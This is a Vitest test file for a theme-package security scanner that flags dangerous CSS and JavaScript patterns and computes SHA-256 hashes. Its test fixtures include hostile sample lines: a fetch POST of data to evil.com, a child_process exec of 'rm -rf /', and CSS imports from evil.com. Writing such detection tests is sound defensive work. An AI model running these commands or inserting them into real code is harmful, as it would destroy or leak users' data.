// SPDX-License-Identifier: MPL-2.0

import { describe, expect, it } from 'vitest';
import { computeSha256, scanCssSource, scanJsSource, scanThemePackage } from './security-scanner';

// ---------------------------------------------------------------------------
// CSS Dangerous Pattern Detection
// ---------------------------------------------------------------------------

describe('scanCssSource', () => {
  it('should detect @import url with external http URL', () => {
    const css = `@import url('https://evil.com/steal.css');\nbody { color: red; }`;
    const findings = scanCssSource(css);
    expect(findings).toHaveLength(1);
    expect(findings[0].type).toBe('css');
    expect(findings[0].pattern).toBe('@import url(external)');
    expect(findings[0].severity).toBe('danger');
    expect(findings[0].line).toBe(1);
  });

  it('should detect @import url with external https URL', () => {
    const css = `@import url("https://cdn.example.com/style.css");`;
    const findings = scanCssSource(css);
    expect(findings.some((f) => f.pattern === '@import url(external)')).toBe(true);
  });

  it('should detect CSS expression()', () => {
    const css = `.foo { width: expression(alert('xss')); }`;
    const findings = scanCssSource(css);
    expect(findings.some((f) => f.pattern === 'expression()')).toBe(true);
    expect(findings[0].severity).toBe('danger');
  });

  it('should detect CSS behavior: url()', () => {
    const css = `.bar { behavior: url('evil.htc'); }`;
    const findings = scanCssSource(css);
    expect(findings.some((f) => f.pattern === 'behavior:')).toBe(true);
    expect(findings[0].severity).toBe('danger');
  });

  it('should detect -moz-binding', () => {
    const css = `.baz { -moz-binding: url('evil.xml#binding'); }`;
    const findings = scanCssSource(css);
    expect(findings.some((f) => f.pattern === '-moz-binding')).toBe(true);
    expect(findings[0].severity).toBe('danger');
  });

  it('should report correct line and column for multi-line CSS', () => {
    const css = `body { color: red; }\n@import url('https://evil.com/s.css');`;
    const findings = scanCssSource(css);
    expect(findings[0].line).toBe(2);
  });

  it('should return empty array for safe CSS', () => {
    const css = `:root { --color-primary: #ff0000; --color-bg: #ffffff; }`;
    const findings = scanCssSource(css);
    expect(findings).toHaveLength(0);
  });
});

// ---------------------------------------------------------------------------
// JS Dangerous Pattern Detection
// ---------------------------------------------------------------------------

describe('scanJsSource', () => {
  it('should detect eval()', () => {
    const js = `const result = eval(userInput);`;
    const findings = scanJsSource(js);
    expect(findings.some((f) => f.pattern === 'eval()')).toBe(true);
    expect(findings[0].severity).toBe('danger');
  });

  it('should detect new Function()', () => {
    const js = `const fn = new Function('a', 'b', 'return a + b');`;
    const findings = scanJsSource(js);
    expect(findings.some((f) => f.pattern === 'new Function()')).toBe(true);
    expect(findings[0].severity).toBe('danger');
  });

  it('should detect fetch()', () => {
    const js = `fetch('https://evil.com/steal', { method: 'POST', body: data });`;
    const findings = scanJsSource(js);
    expect(findings.some((f) => f.pattern === 'fetch()')).toBe(true);
    expect(findings[0].severity).toBe('danger');
  });

  it('should detect XMLHttpRequest', () => {
    const js = `const xhr = new XMLHttpRequest(); xhr.open('GET', url);`;
    const findings = scanJsSource(js);
    expect(findings.some((f) => f.pattern === 'XMLHttpRequest')).toBe(true);
    expect(findings[0].severity).toBe('danger');
  });

  it('should detect localStorage', () => {
    const js = `localStorage.setItem('key', 'value');`;
    const findings = scanJsSource(js);
    expect(findings.some((f) => f.pattern === 'localStorage')).toBe(true);
    expect(findings[0].severity).toBe('warning');
  });

  it('should detect sessionStorage', () => {
    const js = `sessionStorage.setItem('session', token);`;
    const findings = scanJsSource(js);
    expect(findings.some((f) => f.pattern === 'sessionStorage')).toBe(true);
    expect(findings[0].severity).toBe('warning');
  });

  it('should detect child_process', () => {
    const js = `const cp = require('child_process'); cp.exec('rm -rf /');`;
    const findings = scanJsSource(js);
    expect(findings.some((f) => f.pattern === 'child_process')).toBe(true);
    expect(findings[0].severity).toBe('danger');
  });

  it('should detect dynamic require()', () => {
    const js = `const mod = require(dynamicName);`;
    const findings = scanJsSource(js);
    expect(findings.some((f) => f.pattern === 'require(dynamic)')).toBe(true);
    expect(findings[0].severity).toBe('warning');
  });

  it('should not flag static require() with string literal', () => {
    const js = `const fs = require('fs');`;
    const findings = scanJsSource(js);
    expect(findings.some((f) => f.pattern === 'require(dynamic)')).toBe(false);
  });

  it('should return empty array for safe JS', () => {
    const js = `const x = 1 + 2; console.log(x);`;
    const findings = scanJsSource(js);
    expect(findings).toHaveLength(0);
  });
});

// ---------------------------------------------------------------------------
// SHA-256 Computation
// ---------------------------------------------------------------------------

describe('computeSha256', () => {
  it('should compute correct SHA-256 for known input', () => {
    const hash = computeSha256('hello');
    expect(hash).toBe('2cf24dba5fb0a30e26e83b2ac5b9e29e1b161e5c1fa7425e73043362938b9824');
  });

  it('should compute correct SHA-256 for empty string', () => {
    const hash = computeSha256('');
    expect(hash).toBe('e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855');
  });

  it('should produce different hashes for different inputs', () => {
    const hash1 = computeSha256('input-a');
    const hash2 = computeSha256('input-b');
    expect(hash1).not.toBe(hash2);
  });
});

// ---------------------------------------------------------------------------
// Full Theme Package Scan
// ---------------------------------------------------------------------------

describe('scanThemePackage', () => {
  it('should scan a complete theme package with mixed files', () => {
    const files = [
      {
        path: 'palette.css',
        content: ':root { --color-primary: #ff0000; }',
      },
      {
        path: 'renderer-inject.js',
        content: `eval('alert(1)'); fetch('https://evil.com');`,
      },
      {
        path: 'manifest.json',
        content: '{"id": "test-theme", "version": "1.0.0"}',
      },
    ];

    const result = scanThemePackage(files);
    expect(result.findings.length).toBeGreaterThan(0);
    expect(result.findings.some((f) => f.type === 'js')).toBe(true);
    expect(result.safe).toBe(false);
    expect(result.riskLevel).toBe('high');
    expect(result.hash).toBeTruthy();
    expect(result.hash).toHaveLength(64); // SHA-256 hex length
  });

  it('should return safe for a clean theme package', () => {
    const files = [
      {
        path: 'palette.css',
        content: ':root { --color-primary: #ff0000; --color-bg: #ffffff; }',
      },
      {
        path: 'manifest.json',
        content: '{"id": "clean-theme", "version": "1.0.0"}',
      },
    ];

    const result = scanThemePackage(files);
    expect(result.safe).toBe(true);
    expect(result.riskLevel).toBe('low');
    expect(result.findings).toHaveLength(0);
  });

  it('should classify risk level as medium when only warnings present', () => {
    const files = [
      {
        path: 'renderer-inject.js',
        content: `localStorage.setItem('key', 'value'); sessionStorage.clear();`,
      },
    ];

    const result = scanThemePackage(files);
    expect(result.safe).toBe(true);
    expect(result.riskLevel).toBe('medium');
    expect(result.findings.length).toBe(2);
  });

  it('should handle empty file list', () => {
    const result = scanThemePackage([]);
    expect(result.safe).toBe(true);
    expect(result.riskLevel).toBe('low');
    expect(result.findings).toHaveLength(0);
    expect(result.hash).toBe(computeSha256(''));
  });

  it('should produce deterministic hash for same input', () => {
    const files = [
      { path: 'a.css', content: 'body { color: red; }' },
      { path: 'b.js', content: 'console.log("hello");' },
    ];

    const result1 = scanThemePackage(files);
    const result2 = scanThemePackage(files);
    expect(result1.hash).toBe(result2.hash);
  });

  it('should detect multiple CSS dangerous patterns in one file', () => {
    const files = [
      {
        path: 'evil.css',
        content: `@import url('https://evil.com/s.css');\n.foo { width: expression(alert(1)); }\n.bar { behavior: url('evil.htc'); }`,
      },
    ];

    const result = scanThemePackage(files);
    expect(result.findings.length).toBeGreaterThanOrEqual(3);
    expect(result.safe).toBe(false);
    expect(result.riskLevel).toBe('high');
  });
});
